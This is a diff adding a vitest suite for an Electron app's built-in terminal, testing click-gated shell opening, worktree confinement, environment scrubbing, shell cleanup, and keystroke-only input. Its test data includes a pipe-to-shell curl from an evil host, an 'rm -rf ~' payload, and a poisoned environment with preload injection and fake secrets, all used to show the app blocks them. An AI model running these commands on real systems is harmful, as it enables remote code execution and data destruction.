@@ -1,0 +1,451 @@
+import { spawnSync } from 'node:child_process';
+import { EventEmitter } from 'node:events';
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync } from 'node:fs';
+import { tmpdir, userInfo } from 'node:os';
+import { join } from 'node:path';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
+import { input, takeInput } from '../../../main/words';
+import { fits, forgetInput, isReport, mayWrite, sawKey, sawMouse, type SeenKey } from '../../../main/terminalInput';
+
+// docs/contracts/terminal.md: the owner's own shell in a task's or conversation's working copy, run
+// by main (main/terminal.ts). Main's channels run for real, with Electron, obid and its events stood
+// in for; a stand-in pty for the rules, and node-pty's own for what a real shell does.
+const the = await vi.hoisted(async () => {
+  const { mkdtempSync } = await import('node:fs');
+  const { tmpdir } = await import('node:os');
+  const { join } = await import('node:path');
+  return {
+    home: mkdtempSync(join(tmpdir(), 'oby-term-home-')),
+    jobs: new Set<string>(),
+    handlers: new Map<string, (e: unknown, ...a: unknown[]) => unknown>(),
+    live: [] as (() => void)[],
+    state: { gone: new Set<string>(), goneConversations: new Set<string>(), conversations: [] as { id: string; folders?: string[] }[] },
+    clip: '',
+    app: null as unknown as EventEmitter,
+  };
+});
+vi.mock('electron', async () => {
+  const { EventEmitter } = await import('node:events');
+  the.app = Object.assign(new EventEmitter(), { getVersion: () => '1.2.3' });
+  return {
+    app: the.app,
+    clipboard: { readText: async () => the.clip },
+    ipcMain: { on: (n: string, f: never) => the.handlers.set(n, f), handle: (n: string, f: never) => the.handlers.set(n, f) },
+  };
+});
+vi.mock('../../../main/obid', () => ({
+  HOME: the.home,
+  obid: async (_m: string, path: string) => ({ status: the.jobs.has(decodeURIComponent(path.split('/').pop()!)) ? 200 : 404, text: '{}' }),
+}));
+vi.mock('../../../main/live', () => ({ obidState: () => the.state, onLive: (f: () => void) => { the.live.push(f); } }));
+
+const { Terminals, cleanEnv, cwdOf, ownersShell, shellOf, shellArgs, terminals, nodePty, MAX_TERMINALS, KILL_GRACE_MS } = await import('../../../main/terminal');
+type Spawn = import('../../../main/terminal').Spawn;
+
+// A pty that does what it's told and records it; it ends on the signal named in `endsOn`
+class FakePty {
+  static last: FakePty | null = null;
+  pid = 4242; killed: string[] = []; written: string[] = []; sizes: [number, number][] = []; dead = false;
+  data: ((d: string) => void) | null = null; exit: ((e: { exitCode: number; signal?: number }) => void) | null = null;
+  constructor(public file: string, public args: string[], public opts: Parameters<Spawn>[2], public endsOn: string | null) { FakePty.last = this; }
+  onData(f: (d: string) => void) { this.data = f; return { dispose() {} }; }
+  onExit(f: (e: { exitCode: number; signal?: number }) => void) { this.exit = f; return { dispose() {} }; }
+  write(d: string) { this.written.push(d); }
+  resize(c: number, r: number) { if (this.dead) throw new Error('ioctl(2) failed, EBADF'); this.sizes.push([c, r]); }
+  kill(sig = 'SIGHUP') { this.killed.push(sig); if (sig === this.endsOn || sig === 'SIGKILL') this.end(0, 1); }
+  end(code: number, signal?: number) { if (this.dead) return; this.dead = true; this.exit?.({ exitCode: code, signal }); }
+}
+
+type Sent = [string, ...unknown[]];
+const page = () => Object.assign(new EventEmitter(), { isDestroyed: () => false, sent: [] as Sent[], send(...a: Sent) { this.sent.push(a); } });
+type Page = ReturnType<typeof page>;
+let endsOn: string | null = 'SIGHUP';
+const spawned: FakePty[] = [];
+const fake: Spawn = (file, args, opts) => { const p = new FakePty(file, args, opts, endsOn); spawned.push(p); return p; };
+let terms: InstanceType<typeof Terminals>;
+const ENV = { env: { HOME: '/Users/owner', PATH: '/usr/bin:/bin' }, shell: '/bin/zsh' };
+// main's channels, for the window's own page (trusted) or another
+let trustedNow = true;
+function register() {
+  the.handlers.clear();
+  the.live.length = 0;
+  terms = new Terminals(() => fake, (p, ...a) => (p as unknown as Page | null)?.send(...(a as Sent)), () => ENV, KILL_GRACE_MS);
+  terminals(() => trustedNow, terms);
+}
+const open = (p: Page, place: string, id: string, cols = 80, rows = 24) => the.handlers.get('terminal-open')!({ sender: p }, place, id, cols, rows) as Promise<{ term?: string; cwd?: string; error?: string }>;
+const write = (term: string, data: string) => the.handlers.get('terminal-write')!({ sender: null }, term, data);
+const worktree = (id: string) => { const dir = join(the.home, 'worktrees', id); mkdirSync(dir, { recursive: true }); the.jobs.add(id); return realpathSync(dir); };
+const key = (k: string, mods: Partial<SeenKey> = {}) => sawKey({ key: k, control: false, alt: false, meta: false, shift: false, composing: false, ...mods });
+const flush = () => new Promise((r) => setTimeout(r, 10));
+
+beforeEach(() => {
+  while (takeInput()) { /* no click left over */ }
+  forgetInput();
+  spawned.length = 0;
+  endsOn = 'SIGHUP';
+  trustedNow = true;
+  the.jobs.clear();
+  the.state = { gone: new Set(), goneConversations: new Set(), conversations: [] };
+  the.app.removeAllListeners();
+  register();
+});
+afterEach(() => { vi.useRealTimers(); });
+
+describe('TERMINAL-1: a shell opens only on the owner\'s own click', () => {
+  it('terminal_1_a_shell_opens_only_right_after_a_click_main_saw_one_per_click', async () => {
+    worktree('j1');
+    const p = page();
+    expect(await open(p, 'task', 'j1')).toEqual({ error: 'Opening a terminal takes your own click.' });
+    expect(spawned).toHaveLength(0);
+    input();
+    const a = await open(p, 'task', 'j1');
+    expect(a.term).toMatch(/^t\d+$/);
+    expect(spawned).toHaveLength(1);
+    // the same click doesn't open another
+    expect(await open(p, 'task', 'j1')).toEqual({ error: 'Opening a terminal takes your own click.' });
+    expect(spawned).toHaveLength(1);
+  });
+
+  it('terminal_1: another page, or a frame in it, gets the refusal and nothing starts', async () => {
+    worktree('j1');
+    trustedNow = false;
+    input();
+    expect(await open(page(), 'task', 'j1')).toEqual({ error: 'Not this app’s page.' });
+    expect(spawned).toHaveLength(0);
+  });
+
+  it(`terminal_1: at most ${MAX_TERMINALS} shells at once`, async () => {
+    worktree('j1');
+    const p = page();
+    for (let i = 0; i < MAX_TERMINALS; i++) { input(); expect((await open(p, 'task', 'j1')).term).toBeTruthy(); }
+    input();
+    expect((await open(p, 'task', 'j1')).error).toMatch(/at most/);
+    expect(spawned).toHaveLength(MAX_TERMINALS);
+  });
+});
+
+describe('TERMINAL-2: in the working copy main finds itself', () => {
+  it('terminal_2_the_shell_starts_in_the_tasks_worktree_the_owners_login_shell_at_the_measured_size', async () => {
+    const dir = worktree('j1');
+    input();
+    const a = await open(page(), 'task', 'j1', 132, 40);
+    expect(a).toMatchObject({ cwd: dir, name: 'j1' });
+    const p = spawned[0];
+    expect(p.opts).toMatchObject({ cwd: dir, cols: 132, rows: 40, encoding: 'utf8', name: 'xterm-256color' });
+    expect([p.file, p.args]).toEqual([ENV.shell, ['-l']]);
+  });
+
+  it('terminal_2: a job obid doesn\'t have, a worktree that isn\'t there, a link out of obid\'s home or an id with a path open nothing', async () => {
+    mkdirSync(join(the.home, 'worktrees', 'unknown'), { recursive: true });
+    const out = mkdtempSync(join(tmpdir(), 'oby-term-out-'));
+    symlinkSync(out, join(the.home, 'worktrees', 'linked'));
+    the.jobs.add('linked'); the.jobs.add('missing');
+    for (const id of ['unknown', 'missing', 'linked']) {
+      input();
+      expect(await open(page(), 'task', id), id).toEqual({ error: 'This task’s working copy isn’t on this Mac.' });
+    }
+    for (const id of ['../x', 'a/b', '', 'x'.repeat(200)]) {
+      input();
+      expect(await open(page(), 'task', id), id).toEqual({ error: 'Not this app’s page.' });
+    }
+    input();
+    expect(await open(page(), 'repo' as 'task', 'j1')).toEqual({ error: 'Not this app’s page.' });
+    expect(spawned).toHaveLength(0);
+  });
+
+  it('terminal_2: a conversation\'s shell starts in its first folder, as obid lists it; none, nothing', async () => {
+    const a = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-a-'))), b = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-b-')));
+    the.state.conversations = [{ id: 'c1', folders: [a, b] }, { id: 'c2', folders: [] }];
+    expect(await cwdOf('conversation', 'c1')).toBe(a);
+    input();
+    expect((await open(page(), 'conversation', 'c1')).cwd).toBe(a);
+    input();
+    expect(await open(page(), 'conversation', 'c2')).toEqual({ error: 'This conversation has no folder on this Mac.' });
+    input();
+    expect(await open(page(), 'conversation', 'c3')).toEqual({ error: 'This conversation has no folder on this Mac.' });
+    expect(spawned.map((p) => p.opts.cwd)).toEqual([a]);
+  });
+
+  it('terminal_2: the login shell is the one the system has for the owner, never $SHELL', () => {
+    expect(shellOf({ shell: '/opt/homebrew/bin/fish' }, () => true)).toBe('/opt/homebrew/bin/fish');
+    expect(shellOf({ shell: null }, () => true, 'darwin')).toBe('/bin/zsh');
+    expect(shellOf({ shell: 'zsh' }, () => true, 'darwin')).toBe('/bin/zsh');
+    expect(shellOf({ shell: '/gone/zsh' }, () => false, 'darwin')).toBe('/bin/zsh');
+    expect(shellArgs('/bin/zsh')).toEqual(['-l']);
+  });
+});
+
+describe('TERMINAL-3: a clean environment, nothing of Oby\'s', () => {
+  const POISON = {
+    OBID_TOKEN: 'obid-secret', OBID_HOME: '/x', OBY_VAULT_GITHUB: 'vault-secret', ANTHROPIC_API_KEY: 'sk-ant-secret', GITHUB_TOKEN: 'ghp_secret',
+    ELECTRON_RUN_AS_NODE: '1', ELECTRON_RENDERER_URL: 'http://localhost:5175', NODE_OPTIONS: '--require /tmp/evil.js', SHELL: '/tmp/evil-shell',
+    PATH: '/tmp/agent-bin:/usr/bin', LD_PRELOAD: '/tmp/evil.so', DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib', CLAUDE_CONFIG_DIR: '/x', CODEX_HOME: '/x',
+    TMPDIR: '/var/folders/xy/T/', SSH_AUTH_SOCK: '/private/tmp/launchd/Listeners', LANG: 'C', __CF_USER_TEXT_ENCODING: '0x1F5:0x0:0x0',
+  };
+  it('terminal_3_the_shell_gets_only_who_the_owner_is_a_utf8_locale_and_the_terminals_kind', () => {
+    const env = cleanEnv(POISON, { home: '/Users/owner', user: 'owner', shell: '/bin/zsh' }, '1.2.3');
+    expect(env).toEqual({
+      HOME: '/Users/owner', USER: 'owner', LOGNAME: 'owner', SHELL: '/bin/zsh', PATH: '/usr/bin:/bin:/usr/sbin:/sbin', LANG: 'en_US.UTF-8',
+      TERM: 'xterm-256color', COLORTERM: 'truecolor', TERM_PROGRAM: 'Oby', TERM_PROGRAM_VERSION: '1.2.3',
+      TMPDIR: '/var/folders/xy/T/', SSH_AUTH_SOCK: '/private/tmp/launchd/Listeners', __CF_USER_TEXT_ENCODING: '0x1F5:0x0:0x0',
+    });
+    expect(JSON.stringify(env)).not.toMatch(/secret|evil|agent-bin/);
+    expect(cleanEnv({ LANG: 'de_DE.UTF-8' }, { home: '/h', user: 'u', shell: '/bin/zsh' }, '1').LANG).toBe('de_DE.UTF-8');
+    expect(cleanEnv({ TMPDIR: 'a\nb' }, { home: '/h', user: 'u', shell: '/bin/zsh' }, '1').TMPDIR).toBeUndefined();
+  });
+
+  it('terminal_3: main\'s own wiring takes the app\'s environment through it', () => {
+    const kept = { ...process.env };
+    Object.assign(process.env, POISON);
+    try {
+      const { shell, env } = ownersShell('1.2.3');
+      expect(shell).toBe(shellOf(userInfo()));
+      expect(env.SHELL).toBe(shell);
+      expect(Object.keys(env).sort()).toEqual(['COLORTERM', 'HOME', 'LANG', 'LOGNAME', 'PATH', 'SHELL', 'SSH_AUTH_SOCK', 'TERM', 'TERM_PROGRAM', 'TERM_PROGRAM_VERSION', 'TMPDIR', 'USER', '__CF_USER_TEXT_ENCODING']);
+      expect(JSON.stringify(env)).not.toMatch(/secret|evil|agent-bin|ELECTRON|NODE_OPTIONS|OBID/);
+    } finally {
+      for (const k of Object.keys(POISON)) delete process.env[k];
+      Object.assign(process.env, kept);
+    }
+  });
+});
+
+describe('TERMINAL-4: a shell never outlives its tab, its page, its place or Oby', () => {
+  it('terminal_4_closing_a_tab_hangs_the_shell_up_and_kills_what_ignores_it', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
+    worktree('j1');
+    const p = page();
+    endsOn = null;  // ignores SIGHUP and SIGTERM, as a stuck program can
+    input();
+    const { term } = await open(p, 'task', 'j1');
+    the.handlers.get('terminal-close')!({ sender: p }, term);
+    expect(spawned[0].killed).toEqual(['SIGHUP', 'SIGTERM']);
+    vi.advanceTimersByTime(KILL_GRACE_MS - 1);
+    expect(spawned[0].killed).toEqual(['SIGHUP', 'SIGTERM']);
+    vi.advanceTimersByTime(1);
+    expect(spawned[0].killed).toEqual(['SIGHUP', 'SIGTERM', 'SIGKILL']);
+    // one that ends on its hang-up gets nothing more
+    endsOn = 'SIGHUP';
+    input();
+    const second = await open(p, 'task', 'j1');
+    the.handlers.get('terminal-close')!({ sender: p }, second.term);
+    vi.advanceTimersByTime(KILL_GRACE_MS * 2);
+    expect(spawned[1].killed).toEqual(['SIGHUP']);
+  });
+
+  it('terminal_4: Oby quitting ends every shell, and kills any still there before the app ends', async () => {
+    worktree('j1');
+    const p = page();
+    endsOn = null;
+    input(); await open(p, 'task', 'j1');
+    input(); await open(p, 'task', 'j1');
+    the.app.emit('before-quit');
+    expect(spawned.map((s) => s.killed)).toEqual([['SIGHUP', 'SIGTERM'], ['SIGHUP', 'SIGTERM']]);
+    the.app.emit('will-quit');
+    expect(spawned.map((s) => s.killed.at(-1))).toEqual(['SIGKILL', 'SIGKILL']);
+    expect(terms.open).toBe(0);
+  });
+
+  it('terminal_4: its page closing, crashing or loading again ends its shells; another page\'s stay', async () => {
+    worktree('j1');
+    for (const [event, arg] of [['destroyed', undefined], ['render-process-gone', {}], ['did-start-navigation', { isMainFrame: true, isSameDocument: false }]] as const) {
+      const p = page(), other = page();
+      input(); await open(p, 'task', 'j1');
+      input(); await open(other, 'task', 'j1');
+      const [mine, theirs] = spawned.slice(-2);
+      // a link within the page, or a frame in it, isn't the page going
+      p.emit('did-start-navigation', { isMainFrame: true, isSameDocument: true });
+      p.emit('did-start-navigation', { isMainFrame: false, isSameDocument: false });
+      expect(mine.killed, event).toEqual([]);
+      p.emit(event, arg);
+      expect(mine.killed, event).toEqual(['SIGHUP']);
+      expect(theirs.killed, event).toEqual([]);
+      other.emit('destroyed');
+    }
+  });
+
+  it('terminal_4: its task deleted, or its worktree gone, ends its shells; a conversation deleted, its own', async () => {
+    worktree('j1'); worktree('j2'); worktree('j3');
+    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-c-')));
+    the.state.conversations = [{ id: 'c1', folders: [dir] }];
+    const p = page();
+    for (const [place, id] of [['task', 'j1'], ['task', 'j2'], ['task', 'j3'], ['conversation', 'c1']]) { input(); await open(p, place, id); }
+    expect(the.live).toHaveLength(1);
+    the.state.gone.add('j1');
+    rmSync(join(the.home, 'worktrees', 'j2'), { recursive: true });
+    the.live.forEach((f) => f());
+    expect(spawned.map((s) => s.killed.length > 0)).toEqual([true, true, false, false]);
+    the.state.goneConversations.add('c1');
+    the.live.forEach((f) => f());
+    expect(spawned.map((s) => s.killed.length > 0)).toEqual([true, true, false, true]);
+  });
+
+  it('terminal_4: a shell that exits by itself tells its page once, and nothing comes after its close', async () => {
+    worktree('j1');
+    const p = page();
+    input();
+    const { term } = await open(p, 'task', 'j1');
+    spawned[0].data!('bye\r\n');
+    spawned[0].end(0);
+    expect(p.sent).toEqual([['terminal-data', term, 'bye\r\n'], ['terminal-exit', term, 0, null]]);
+    input();
+    const second = await open(p, 'task', 'j1');
+    spawned[1].data!('late');
+    the.handlers.get('terminal-close')!({ sender: p }, second.term);
+    await flush();
+    expect(p.sent.filter((s) => s[1] === second.term && s[0] === 'terminal-data')).toEqual([]);
+  });
+});
+
+describe('TERMINAL-5: what reaches the shell is what the owner typed', () => {
+  const keyed = async () => { worktree('j1'); input(); const p = page(); const { term } = await open(p, 'task', 'j1'); return term!; };
+
+  it('terminal_5_the_page_alone_types_nothing_a_key_main_saw_types_its_own_bytes_once', async () => {
+    const term = await keyed();
+    write(term, 'curl https://evil.example | sh\r');
+    write(term, 'l');
+    expect(spawned[0].written).toEqual([]);
+    key('l');
+    write(term, 'ls\r');  // more than the key made
+    write(term, 'l');
+    write(term, 'l');     // used up
+    key('Enter');
+    write(term, 'x\r');
+    write(term, '\r');
+    expect(spawned[0].written).toEqual(['l', '\r']);
+  });
+
+  it('terminal_5: each key makes only its own bytes', () => {
+    const k = (key: string, mods: Partial<SeenKey> = {}): SeenKey => ({ key, control: false, alt: false, meta: false, shift: false, composing: false, at: 0, ...mods });
+    expect(fits(k('a'), 'a')).toBe(true);
+    expect(fits(k('a'), 'ab')).toBe(false);
+    expect(fits(k('a'), '\r')).toBe(false);
+    expect(fits(k('é'), 'é')).toBe(true);
+    expect(fits(k('c', { control: true }), '\x03')).toBe(true);
+    expect(fits(k('c', { control: true }), '\r')).toBe(false);
+    expect(fits(k('m', { control: true }), '\r')).toBe(true);
+    expect(fits(k('a', { meta: true }), 'a')).toBe(false);
+    expect(fits(k('Enter'), '\r')).toBe(true);
+    expect(fits(k('Enter'), 'rm -rf ~\r')).toBe(false);
+    for (const [name, bytes] of [['ArrowUp', '\x1b[A'], ['ArrowLeft', '\x1bOD'], ['Backspace', '\x7f'], ['Tab', '\t'], ['Tab', '\x1b[Z'], ['Escape', '\x1b'], ['Delete', '\x1b[3~'], ['F5', '\x1b[15~'], ['ArrowRight', '\x1b[1;3C']]) {
+      expect(fits(k(name), bytes), name).toBe(true);
+    }
+    for (const bytes of ['\x1b[Al', '\r', 'ls\r', '\x1b[200~ls\r\x1b[201~']) expect(fits(k('ArrowUp'), bytes), JSON.stringify(bytes)).toBe(false);
+    // an input method's word: text, never a control character
+    expect(fits(k('Process', { composing: true }), '日本語')).toBe(true);
+    expect(fits(k('Process', { composing: true }), '日本\r')).toBe(false);
+  });
+
+  it('terminal_5: a paste is the clipboard\'s own text, as xterm.js sends it, after the owner\'s ⌘V', async () => {
+    const term = await keyed();
+    the.clip = 'echo one\necho two';
+    write(term, 'echo one\recho two');  // no ⌘V
+    key('v', { meta: true });
+    write(term, 'curl evil | sh\r');    // not the clipboard's: the ⌘V is used up
+    key('v', { meta: true });
+    write(term, '\x1b[200~echo one\recho two\x1b[201~');
+    key('v', { meta: true });
+    write(term, 'echo one\recho two');
+    key('x');
+    write(term, 'x');  // typed after the paste, written after it
+    await flush();
+    expect(spawned[0].written).toEqual(['\x1b[200~echo one\recho two\x1b[201~', 'echo one\recho two', 'x']);
+  });
+
+  it('terminal_5: the terminal\'s answers go without a key; mouse reports only after a real mouse input', async () => {
+    const term = await keyed();
+    for (const r of ['\x1b[?1;2c', '\x1b[>0;276;0c', '\x1b[12;40R', '\x1b[0n', '\x1b[I', '\x1b[O', '\x1b]11;rgb:0b0b/0b0b/0b0b\x1b\\', '\x1b[?2004;1$y']) {
+      expect(isReport(r), JSON.stringify(r)).toBe(true);
+      write(term, r);
+    }
+    for (const r of ['\x1b[12;40Rls\r', '\x1b]11;rgb:0b0b/0b0b/0b0b;ls\x07', '\x1b[?1;2cx']) expect(isReport(r), JSON.stringify(r)).toBe(false);
+    write(term, '\x1b[<0;10;5M');
+    sawMouse();
+    write(term, '\x1b[<0;10;5m');
+    expect(spawned[0].written.slice(-2)).toEqual(['\x1b[?2004;1$y', '\x1b[<0;10;5m']);
+    expect(spawned[0].written).toHaveLength(9);
+  });
+
+  it('terminal_5: a key is good for 2 seconds', () => {
+    sawKey({ key: 'a', control: false, alt: false, meta: false, shift: false, composing: false }, 1000);
+    expect(mayWrite('a', () => '', 3001)).toBe(false);
+    sawKey({ key: 'a', control: false, alt: false, meta: false, shift: false, composing: false }, 5000);
+    expect(mayWrite('a', () => '', 6999)).toBe(true);
+  });
+});
+
+describe('TERMINAL-6: sizes', () => {
+  it('terminal_6_a_resize_reaches_the_shell_once_and_never_after_it_ended', async () => {
+    worktree('j1');
+    input();
+    const { term } = await open(page(), 'task', 'j1', 80, 24);
+    const resize = (c: unknown, r: unknown) => the.handlers.get('terminal-resize')!({ sender: null }, term, c, r);
+    resize(80, 24);           // the size it has
+    resize(0, 24); resize(80, 0); resize(1001, 24); resize(80.5, 24); resize(NaN, 24);
+    resize(100, 30);
+    resize(100, 30);
+    expect(spawned[0].sizes).toEqual([[100, 30]]);
+    spawned[0].dead = true;   // its shell ended, its exit not yet told: the resize races it
+    expect(() => resize(120, 40)).not.toThrow();
+    expect(terms.resize(term!, 120, 40)).toBe(false);
+  });
+
+  it('terminal_6: no room to open in, nothing opens', async () => {
+    worktree('j1');
+    input();
+    expect(await open(page(), 'task', 'j1', 0, 0)).toEqual({ error: 'The terminal has no room to open in.' });
+  });
+});
+
+describe('TERMINAL-7: output', () => {
+  it('terminal_7_output_that_comes_together_goes_to_the_page_in_one_message', async () => {
+    worktree('j1');
+    const p = page();
+    input();
+    const { term } = await open(p, 'task', 'j1');
+    for (const c of ['a', 'b', 'c']) spawned[0].data!(c);
+    await flush();
+    expect(p.sent).toEqual([['terminal-data', term, 'abc']]);
+  });
+});
+
+// node-pty's own pty and a real shell: the rules above, as a person at the terminal sees them
+describe('TERMINAL-8: a real shell', () => {
+  const bash = '/bin/bash';
+  const real = () => {
+    const out: string[] = [], exits: unknown[] = [];
+    const t = new Terminals(nodePty, (_p, channel, _id, data) => { if (channel === 'terminal-data') out.push(data as string); else exits.push(channel); }, () => {
+      const who = userInfo();
+      return { shell: bash, env: cleanEnv({ ...process.env, OBY_TERMINAL_TEST_SECRET: 'vault-secret-value' }, { home: who.homedir, user: who.username, shell: bash }, '1.2.3') };
+    }, 300);
+    return { t, text: () => out.join(''), exits };
+  };
+  const until = async (f: () => boolean, ms = 10_000) => { const end = Date.now() + ms; while (!f()) { if (Date.now() > end) throw new Error('timed out'); await new Promise((r) => setTimeout(r, 20)); } };
+  // running, not gone or a zombie waiting to be reaped
+  const alive = (pid: number) => { const st = spawnSync('ps', ['-o', 'stat=', '-p', String(pid)], { encoding: 'utf8' }).stdout.trim(); return !!st && !st.startsWith('Z'); };
+
+  it('terminal_8_a_real_shell_runs_in_the_folder_with_a_clean_environment_utf8_whole_and_ends_with_its_jobs', async () => {
+    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-real-')));
+    const { t, text } = real();
+    const opened = t.start(null, 'task', 'j1', dir, 80, 24);
+    expect('term' in opened).toBe(true);
+    const term = (opened as { term: string }).term;
+    t.write(term, 'printf "WHERE=%s\\n" "$(pwd -P)"; env | grep -c SECRET; printf "\\303\\251%.0s" $(seq 1 3000); printf "\\nDONE\\n"\r');
+    await until(() => /\r\nDONE\r\n/.test(text()));
+    expect(text()).toContain(`WHERE=${dir}`);
+    expect(text()).not.toContain('vault-secret-value');
+    expect(text()).toMatch(/\r\n0\r\n/);
+    // 6,000 bytes of é in chunks the pty cuts where it likes: every one whole, none garbled
+    expect(text()).toContain('é'.repeat(3000));
+    expect(text()).not.toContain('�');
+    // a job left running in it ends with it
+    t.write(term, 'sleep 300 & echo "JOB=$!"\r');
+    await until(() => /JOB=\d+/.test(text()));
+    const job = Number(/JOB=(\d+)/.exec(text())![1]);
+    const shellPid = (t as unknown as { terms: Map<string, { pty: { pid: number } }> }).terms.get(term)!.pty.pid;
+    expect(alive(job)).toBe(true);
+    t.close(term);
+    await until(() => !alive(shellPid) && !alive(job));
+    t.killLeft();
+  });
+});
